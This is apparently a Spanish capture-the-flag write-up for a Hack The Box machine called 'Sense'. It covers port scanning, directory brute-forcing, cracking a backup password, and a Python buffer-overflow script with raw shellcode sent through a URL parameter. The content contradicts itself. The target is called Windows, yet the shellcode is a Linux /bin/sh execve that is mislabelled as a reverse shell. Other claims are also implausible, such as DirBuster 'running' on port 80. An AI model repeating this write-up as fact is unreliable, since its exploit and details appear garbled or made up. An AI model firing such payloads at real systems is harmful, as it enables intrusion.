# 🖥️ HTB: Sense

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Sense |
| **Plataforma** | Hack The Box |
| **Dificultad** | Medium |
| **Categoría** | Web / Buffer Overflow |
| **IP** | 10.10.10.60 |
| **OS** | Windows |
| **Fecha** | 2024 |
| **Tiempo** | 120 min |

---

## 🎯 Resumen Ejecutivo

> Encontré **DirBuster** corriendo en el puerto 80, descubrí un panel de admin protegido con Basic Auth, crackeé las credenciales, y encontré una vulnerabilidad de **Buffer Overflow** en el parámetro `ession` de Snort.

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_sense.txt 10.10.10.60
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 22 | SSH | OpenSSH | Open |
| 80 | HTTP | Apache httpd 2.4.25 | Open |
| 443 | HTTPS | Apache httpd 2.4.25 | Open |

### Web Enumeration

```bash
# Descubrir directorios
gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirb/big.txt -k

# Resultados interesantes:
# /index.php
# /admin/ → 401 (Basic Auth)
# /robots.txt
# /server-status
```

**Hallazgos:**
- `/robots.txt` contiene lista de archivos de backups
- `/admin/` requiere autenticación Basic
- Snort IDS está instalado

### Crackear Credenciales

```bash
# Descargar backup de robots.txt
curl -k https://10.10.10.60/backup/45cf-b28d56.zip

# Crackear hash
john --wordlist=rockyou.txt hash.txt
# Password: password1
```

---

## 💥 Explotación

### Panel de Admin

```bash
# Login con credenciales
# User: admin
# Pass: password1
```

**Resultado:** Acceso al dashboard de Snort.

### Buffer Overflow

**Hallazgo:** El parámetro `ession` en la URL es vulnerable a buffer overflow.

```python
#!/usr/bin/env python3
import struct
import requests

offset = 4062  # EIP offset

# Shellcode reverse shell
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# Construir payload
payload = b"A" * offset
payload += struct.pack("<I", 0x7c9d30d7)  # JMP ESP (ntdll.dll)
payload += shellcode

# Enviar
requests.get(f"https://10.10.10.60/index.php?ession={payload}", verify=False)
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `C:\Users\Babis\Desktop\user.txt` |
| **Root** | `FLAG{...}` | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- robots.txt revela archivos de backup
- Credenciales en backup son reutilizables
- Buffer overflow requiere debugging paciente

### 🔄 Qué haría diferente
- Usar GDB/Immunity Debugger para encontrar offset exacto
- Probar más jmp esp addresses

---

*Writeup creado para CDPN — Nivel Medio*
